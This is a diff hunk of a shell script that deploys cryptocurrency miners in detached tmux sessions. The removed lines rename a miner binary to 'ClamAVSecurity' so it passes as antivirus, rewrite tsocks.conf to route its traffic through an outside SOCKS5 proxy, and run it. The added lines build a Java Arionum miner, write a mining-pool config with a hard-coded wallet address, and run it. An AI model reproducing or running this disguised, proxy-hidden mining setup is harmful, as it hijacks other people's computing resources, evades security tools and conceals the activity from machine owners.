@@ -80,15 +80,27 @@ route add 117.7.81.138 gw $IP
 route add default dev ppp0
 wget -qO- http://ipv4.icanhazip.com/ > ip.txt
 
-#!/bin/bash
-sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install tsocks
-git clone https://github.com/quangvu1602/ariocppminer.git
-cd ariocppminer
-mv ariocppminer_avx2 ClamAVSecurity
-chmod 0777 ClamAVSecurity
-sed -i 's/192.168.0.0/0.0.0.0/g' /etc/tsocks.conf
-sed -i 's/255.255.255.0/0.0.0.0/g' /etc/tsocks.conf
-sed -i 's/192.168.0.1/38.141.47.57/g' /etc/tsocks.conf
-sed -i 's/server_port = 1080/server_port = 1221/g' /etc/tsocks.conf
-sed -i 's/server_type = 4/server_type = 5/g' /etc/tsocks.conf
-tsocks tmux new-session -d -s my_session1 './ClamAVSecurity'
+#! /bin/bash
+set -x #echo on
+sudo apt-get update
+sudo apt-get install openjdk-8-jdk maven git gcc make -y
+sudo apt-get install build-essential -y
+cd 
+git clone git://github.com/Programmerdan/arionum-java
+cd arionum-java/arionum-miner
+git checkout investigate
+touch config.cfg
+chmod 755 config.cfg
+echo "pool
+http://aropool.com/
+47VJTSocAAVkfoJ2o2fW4bQiiukiiAFNvWPsCfgcWZ5FZthq7HJxBMHo9rRe8jvRfSireoZYLJGWY2GTaYWs4M54
+12
+enhanced
+true
+`hostname`" > config.cfg
+mvn clean package
+chmod +x build-argon.sh
+./build-argon.sh
+chmod +x run.sh
+sudo apt-get install tmux -y
+tmux new-session -d -s my_session './run.sh'
